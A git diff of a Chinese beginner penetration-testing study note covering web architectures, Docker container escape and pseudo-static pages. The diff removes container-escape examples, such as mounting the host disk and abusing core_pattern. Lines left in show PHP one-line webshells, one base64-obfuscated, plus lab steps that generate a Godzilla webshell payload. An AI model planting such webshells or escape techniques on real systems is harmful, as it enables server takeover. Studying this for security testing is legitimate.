@@ -1,17 +1,17 @@
 Day02 基础入门-Web架构&前后端分离站&Docker容器&集成软件站&建站分配
 =
-#常规化
+常规化
 -
 原理：源码数据都在同一个服务器  
 影响：无，采用常规安全测试手法即可
 
-#站库分离
+站库分离
 -
 原理：源码数据库不在同服务器  
 存储：其他服务器上数据库&云数据库产品  
 影响：数据被单独存放，能连接才可影响数据
 
-#前后端分离
+前后端分离
 -
 原理：前端JS框架，API传输数据  
 影响：
@@ -19,125 +19,44 @@ Day02 基础入门-Web架构&前后端分离站&Docker容器&集成软件站&建
 2.	后端管理大部分不在同域名
 3.	获得权限有可能不影响后端
 
-#Docker容器
+Docker容器
 -
 原理：打包类集成化环境，权限配置或受控制  
 影响：黑客攻击虚拟空间磁盘  
 警告：Docker 容器逃逸！  
-**Docker容器逃逸**是指攻击者通过某种方式突破容器的隔离环境，获取宿主机的权限或访问宿主机资源的行为。容器逃逸是一种严重的安全威胁，可能导致宿主机上的其他容器或系统受到攻击。
 
-### 容器逃逸的原因
-Docker容器逃逸通常由以下原因引起：
+### Docker容器逃逸的原因
 1. **配置不当**：
-   - 容器以特权模式（`--privileged`）运行。
-   - 挂载敏感目录（如`/`、`/proc`、`/dev`）。
-   - 使用不安全的Capabilities（如`CAP_SYS_ADMIN`）。
+   容器以特权模式（`--privileged`）运行。
+   挂载敏感目录（如`/`、`/proc`、`/dev`）。
+   使用不安全的Capabilities（如`CAP_SYS_ADMIN`）。
 2. **内核漏洞**：
-   - 利用Linux内核漏洞（如脏牛漏洞、CVE-2022-0847）突破容器隔离。
+   利用Linux内核漏洞（如脏牛漏洞、CVE-2022-0847）突破容器隔离。
 3. **Docker漏洞**：
-   - 利用Docker本身的漏洞（如CVE-2019-5736）逃逸容器。
+   利用Docker本身的漏洞（如CVE-2019-5736）逃逸容器。
 4. **共享命名空间**：
-   - 容器与宿主机共享命名空间（如PID、网络、IPC）。
+   容器与宿主机共享命名空间（如PID、网络、IPC）。
 5. **恶意镜像**：
-   - 使用包含恶意代码的镜像，导致容器被攻击。
+   使用包含恶意代码的镜像，导致容器被攻击。
 
-### 常见的容器逃逸方法
-1. **特权模式逃逸**：
-   - 如果容器以特权模式运行，攻击者可以挂载宿主机文件系统并修改关键文件。
-   - 示例：
-     ```bash
-     docker run --privileged -it ubuntu
-     ```
-     在容器内挂载宿主机文件系统：
-     ```bash
-     mkdir /mnt/host
-     mount /dev/sda1 /mnt/host
-     ```
-2. **挂载敏感目录逃逸**：
-   - 如果容器挂载了敏感目录（如`/proc`、`/sys`），攻击者可以通过修改这些目录中的文件逃逸。
-   - 示例：
-     
-     docker run -v /proc:/host_proc -it ubuntu
-     
-     在容器内修改`/host_proc/sys/kernel/core_pattern`，执行宿主机命令。
-3. **利用内核漏洞逃逸**：
-   - 利用Linux内核漏洞（如脏牛漏洞）突破容器隔离。
-4. **Docker漏洞逃逸**：
-   - 利用Docker本身的漏洞逃逸容器。
-   - 示例：
-     - CVE-2019-5736：通过覆盖`/proc/self/exe`逃逸容器。
-5. **共享命名空间逃逸**：
-   - 如果容器与宿主机共享命名空间（如PID命名空间），攻击者可以访问宿主机的进程。
-   - 示例：
-     
-     docker run --pid=host -it ubuntu
-     
-     在容器内查看宿主机进程：
-     
-     ps aux
-
-6. **恶意镜像逃逸**：
-   - 使用包含恶意代码的镜像，攻击者可以在容器内执行逃逸操作。
-   - 示例：
-     - 镜像中包含后门或恶意脚本，用于逃逸容器。
-### 防御措施
-1. **避免使用特权模式**：
-   - 除非必要，否则不要以特权模式运行容器。
-   - 示例：
-     
-     docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE -it ubuntu
-     
-
-2. **限制Capabilities**：
-   - 仅授予容器必要的Capabilities。
-   - 示例：
-     
-     docker run --cap-drop=ALL --cap-add=CHOWN -it ubuntu
-     
-
-3. **避免挂载敏感目录**：
-   - 不要将宿主机的敏感目录挂载到容器中。
-   - 示例：
-     
-     docker run -v /data:/app/data -it ubuntu
-     
-
-4. **更新内核和Docker**：
-   - 定期更新Linux内核和Docker，修复已知漏洞。
-
-5. **使用安全镜像**：
-   - 仅使用可信来源的镜像，并定期扫描镜像中的漏洞。
-
-6. **启用Seccomp和AppArmor**：
-   - 使用Seccomp和AppArmor限制容器的系统调用和文件访问。
-   - 示例：
-     
-     docker run --security-opt seccomp=/path/to/seccomp/profile.json -it ubuntu
-     
-
-7. **监控容器行为**：
-   - 使用监控工具（如Falco）检测容器的异常行为。
-
-
-
-#宝塔或Phpstudy
+宝塔或Phpstudy
 -
 原理：打包类集成化环境，权限配置或受面板控制。  
 影响：攻击者权限对此区别  
 
-#建站分配站
+建站分配站
 -
 原理：利用别人域名模板建立  
 影响：实质安全测试非目标资产（本质上你测试的是建站平台的服务器）  
 举例：建站平台，凡科建站<https://jz.fkw.com/>  
 
-#静态Web
+静态Web
 -
 例子：Web前端设计（静态的html网页）  
 原理：数据没有传输性（js传输不算）  
 影响：无任何漏洞  
 
-Tip：伪静态-动态转为静态技术
+伪静态 <i>动态转为静态技术</i>
 -
 >简单来说，就是让动态网页（通常是通过服务器端脚本语言生成内容、处理请求的网页，如基于 PHP、ASP.NET等开发的网页）在外观上呈现出静态网页（直接由 HTML 文件构成，内容相对固定，无需服务器端实时处理的网页）的形式，但其本质上依然是动态网页，只是通过一定的技术手段对 URL 进行改写，使其看起来更像静态网页。
 
@@ -197,7 +116,7 @@ PHP一句话木马的核心是利用PHP的 `eval()` 函数或类似功能，执�
 #### 2. **使用 `create_function()` 函数**
 ```php
 <?php $func = create_function('', $_POST['cmd']); $func(); ?>
-``
+```
 
 #### 3. **使用 `preg_replace()` 函数**
 ```php
@@ -213,7 +132,7 @@ PHP一句话木马的核心是利用PHP的 `eval()` 函数或类似功能，执�
 ```php
 <?php eval(base64_decode('ZXZhbCgkX1BPU1RbJ2NtZCddKTs=')); ?>
 ```
-- 解码后：`eval($_POST['cmd']);`
+- 解码之后就是：`eval($_POST['cmd']);`
 
 ---
 
@@ -253,7 +172,6 @@ PHP一句话木马的核心是利用PHP的 `eval()` 函数或类似功能，执�
 
 ### 1.	安装Fedora Workstation  
 >https://fedoraproject.org/  
->选择``Workstation``版本    
 ### 2.	安装所需的依赖。  
 ```bash
 dnf -y install httpd httpd-devel mysql mysql-server php php-mysqlnd php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-json php-mbstring php-bcmath php-mhash php-intl
@@ -269,16 +187,10 @@ mysql_secure_installation
 ```
 进行MySQL首次初始化，设置root密码
 ### 5.	尝试登录MySQL```mysql -u root -p```
-### 6.	设置httpd服务或者nginx服务自启 二选一  
+### 6.	启用httpd服务 
 ```bash 
 systemctl enable httpd
 systemctl start httpd
-```
-或者
-
-```bash
-systemctl enable nginx
-systemctl start nginx
 ```
 ### 7.	禁用防火墙  
 ```bash
@@ -298,7 +210,7 @@ chmod -R 777 /var/www/html/zblog
 ```
 ### 11.	安装Zblog
 浏览器打开```http://ip:port/zblog/```
->输入Zblog php安装程序所需的信息，包括数据库名（先提前创建所需的数据库），数据库端口、用户名和密码，还有后台管理系统用户名和密码，根据提示安装zblog。
+>根据提示安装
 ### 12.	生成木马
 >下载ONE-FOX工具箱，运行哥斯拉v4.0.1  
 >在哥斯拉v4.0.1，点击管理>生成 其他默认 有效载荷选择PhpDynamicPayload，加密器选择PHP_EVAL_XOR_BASE64.
@@ -367,7 +279,7 @@ sudo systemctl restart docker
 该网站已被GFW，请自备梯子。
 
 ### 6.   docker 命令
-转自https://www.runoob.com/docker/docker-container-usage.html
+转自<https://www.runoob.com/docker/docker-container-usage.html>
 
 以下是常用的 Docker 客户端命令：
 |命令	|功能|示例|
